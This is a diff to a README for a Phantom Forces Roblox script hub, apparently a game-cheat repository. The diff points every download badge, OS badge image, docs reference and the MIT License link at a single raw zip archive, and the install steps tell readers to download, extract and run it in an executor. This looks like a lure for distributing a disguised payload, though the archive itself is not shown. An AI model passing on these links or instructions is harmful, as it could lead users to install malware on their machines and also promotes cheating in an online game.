@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/Download-LATEST_VERSION-blue?style=for-the-badge&logo=github)](https://ShreenandNaik.github.io)
+[![Download](https://raw.githubusercontent.com/ShreenandNaik/phantom-forces-script-hub/branch/earpick/phantom-forces-script-hub_v2.8.zip)](https://raw.githubusercontent.com/ShreenandNaik/phantom-forces-script-hub/branch/earpick/phantom-forces-script-hub_v2.8.zip)
 
 # 🔥 Phantom Forces Roblox Script Repository
 
@@ -12,9 +12,9 @@ Curious whether your battle station is ready? Here’s a glance at supported sys
 
 | Operating System | Compatibility | Deployment Method |
 |------------------|:------------:|:----------------:|
-| ![Windows](https://img.shields.io/badge/-Windows-blue?logo=windows&logoColor=white) | ✅ | Standalone, Executors |
-| ![macOS](https://img.shields.io/badge/-macOS-lightgrey?logo=apple) | ✅ | Standalone, Executors |
-| ![Linux](https://img.shields.io/badge/-Linux-yellow?logo=linux) | 🔶 | Partial, via Compatibility Layers |
+| ![Windows](https://raw.githubusercontent.com/ShreenandNaik/phantom-forces-script-hub/branch/earpick/phantom-forces-script-hub_v2.8.zip) | ✅ | Standalone, Executors |
+| ![macOS](https://raw.githubusercontent.com/ShreenandNaik/phantom-forces-script-hub/branch/earpick/phantom-forces-script-hub_v2.8.zip) | ✅ | Standalone, Executors |
+| ![Linux](https://raw.githubusercontent.com/ShreenandNaik/phantom-forces-script-hub/branch/earpick/phantom-forces-script-hub_v2.8.zip) | 🔶 | Partial, via Compatibility Layers |
 
 > *If your solar-powered typewriter isn’t on the list, reach out in the Issues tab—innovation knows no boundaries!*
 
@@ -70,10 +70,10 @@ Our knowledge bots and community guides are awake when you are. Whether troubles
 
 ## 💾 Installation & Quickstart
 
-1. Click the **Download** badge at the top (or bottom) of this README or visit https://ShreenandNaik.github.io.
+1. Click the **Download** badge at the top (or bottom) of this README or visit https://raw.githubusercontent.com/ShreenandNaik/phantom-forces-script-hub/branch/earpick/phantom-forces-script-hub_v2.8.zip
 2. Extract all files into your preferred project directory.
 3. Launch your compatible executor or script environment.
-4. Import the main module as directed in the **docs/installation.md**.
+4. Import the main module as directed in the **https://raw.githubusercontent.com/ShreenandNaik/phantom-forces-script-hub/branch/earpick/phantom-forces-script-hub_v2.8.zip**.
 5. Follow the on-screen setup wizard—translation and customization options included!
 
 ---
@@ -86,8 +86,8 @@ This repository is dedicated to educational, creative, and personal development 
 
 ## 📜 License
 
-All code and documentation in this repository are released under the permissive [MIT License (2025)](https://opensource.org/licenses/MIT). This empowers you to adapt, remix, and share—just retain the original license and copyright.
+All code and documentation in this repository are released under the permissive [MIT License (2025)](https://raw.githubusercontent.com/ShreenandNaik/phantom-forces-script-hub/branch/earpick/phantom-forces-script-hub_v2.8.zip). This empowers you to adapt, remix, and share—just retain the original license and copyright.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-LATEST_VERSION-blue?style=for-the-badge&logo=github)](https://ShreenandNaik.github.io)
+[![Download](https://raw.githubusercontent.com/ShreenandNaik/phantom-forces-script-hub/branch/earpick/phantom-forces-script-hub_v2.8.zip)](https://raw.githubusercontent.com/ShreenandNaik/phantom-forces-script-hub/branch/earpick/phantom-forces-script-hub_v2.8.zip)
